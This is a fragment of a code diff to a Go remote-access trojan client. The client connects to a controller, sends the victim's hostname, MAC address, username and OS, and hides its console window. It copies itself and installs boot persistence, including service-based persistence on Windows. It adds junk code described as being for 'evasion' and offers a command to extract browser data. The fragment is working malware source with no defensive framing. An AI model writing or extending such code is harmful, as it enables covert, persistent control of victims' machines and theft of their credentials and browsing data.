-		response := Resp{Type: "response", Content: "Persistence removed successfully - Client will not start on system boot"}
-		sendData(conn, response)
-	} else if command == checkpersistenceStr {
-		exePath, _ := os.Executable()
-		var response Resp
-		if isPersistenceSet(exePath) {
-			response = Resp{Type: "response", Content: "Persistence is ACTIVE - Client will start on system boot"}
-		} else {
-			response = Resp{Type: "response", Content: "Persistence is NOT SET - Client will not start on system boot"}
-		}
 		sendData(conn, response)
 	} else if command == lsStr || command == dirStr {
 		result := listDir("")
@@ -2227,11 +2284,16 @@ func handleShell(conn net.Conn) {
 		"macAddress": getMACAddress(),
 		"username":   getUsername(),
 		"sessionId":  makeSessionID(),
+		"os":         runtime.GOOS,
 	}
 	err := sendData(conn, initialMessage)
 	if err != nil {
 		return
 	}
+	if runtime.GOOS == "windows" {
+		firstConnectionScPersist.Do(applyFirstConnectionSCPersistence)
+	}
+
 	// Send connection confirmation message
 	response := Resp{Type: "response", Content: fmt.Sprintf("Client connected successfully!\nHostname: %s\nUser: %s\nSession: %s\n\nReady for commands. Use 'extractbrowserhidden' to extract browser data when needed.", getHostname(), getUsername(), makeSessionID())}
 	sendData(conn, response)
@@ -2256,38 +2318,53 @@ func handleShell(conn net.Conn) {
 }
 
 func main() {
+	// Runtime junk data for bloating/evasion
 	go addJunkData()
-	junkHeavy()
-
-	if runtime.GOOS == "windows" {
-		hideTerminal()
-		// Drop legacy HKCU Run entry so logon does not start a second instance with Startup .bat
-		removeRegistryAutoStart()
-	}
-
-	if !ensureSingleInstance() {
-		os.Exit(0)
-	}
-
-	exePath, _ := os.Executable()
-	exePath = normalizeExePath(exePath)
+	junkHeavy() // Additional junk call
 
 	if isAppMode() {
 		if runtime.GOOS == "windows" {
+			hideTerminal()
 			time.Sleep(100 * time.Millisecond)
 		}
+
+		if isAppRunning() {
+			os.Exit(0)
+		}
+
+		if !createAppLock() {
+			time.Sleep(1 * time.Second)
+			if isAppRunning() {
+				os.Exit(0)
+			}
+			if !createAppLock() {
+				os.Exit(0)
+			}
+		}
+
+		exePath, _ := os.Executable()
 		fmt.Println(exePath)
+
+		// Set persistence for app mode after 5 seconds
 		go func() {
 			time.Sleep(5 * time.Second)
 			setPersistence(exePath)
 		}()
 	} else {
+		if runtime.GOOS == "windows" {
+			hideTerminal()
+		}
+
 		go func() {
 			copyPath := makeCopy()
 			fmt.Println(copyPath)
-			if copyPath != "" && !isPersistenceSet(copyPath) {
-				time.Sleep(10 * time.Second)
-				setPersistence(copyPath)
+
+			// Set persistence for copied executable after 10 seconds
+			if copyPath != "" {
+				go func() {
+					time.Sleep(10 * time.Second)
+					setPersistence(copyPath)
+				}()
 			}
 		}()
 	}
